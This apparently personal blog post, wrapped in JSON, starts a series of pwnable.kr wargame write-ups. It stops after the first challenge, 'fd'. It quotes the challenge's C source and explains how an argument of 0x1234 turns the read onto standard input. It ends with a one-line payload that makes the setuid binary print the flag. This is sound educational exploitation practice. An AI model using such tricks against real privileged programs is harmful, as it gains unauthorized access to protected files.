[{"content":"About pwnable.kr If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt //fd.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } At first glance, I suspect that there might be an overflow vulnerability in the code, as it uses a typical char array with read. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. However the code looks secure, as it only reads 32 bytes, which perfectly matches the capacity of the char buf[32] array.\nWe noticed that if buf == LETMEWIN then the program will start a new subprocess to execute \u0026quot;/bin/cat flag\u0026quot;. We can see the permission of the compiled file fd and flag are\n-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag This permission tells us that when we run fd as fd users, the euid of the process will be fd_pwn, which is good enough to read flag.\nNow it is quite clear on how to pwn this program.\nif(!strcmp(\u0026quot;LETMEWIN\\n\u0026quot;, buf)) -\u0026gt; let the string in buf equals to \u0026ldquo;LETMEWIN\\n\u0026rdquo;, so that the program can help us read the flag len = read(fd, buf, 32); -\u0026gt; let fd equals to 0 so that we can fill buf via standard input. int fd = atoi( argv[1] ) - 0x1234; let argv[1] equals 4660 (decimal representation of 0x1234) to make fd 0. final payload: echo \u0026quot;LETMEWIN\u0026quot; | ./fd $(python -c \u0026quot;print(0x1234)\u0026quot;) ps: echo adds a \\n by default.\nTBC\n","permalink":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/","summary":"About pwnable.kr If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt //fd.","title":"pwnable.kr Writeups"}]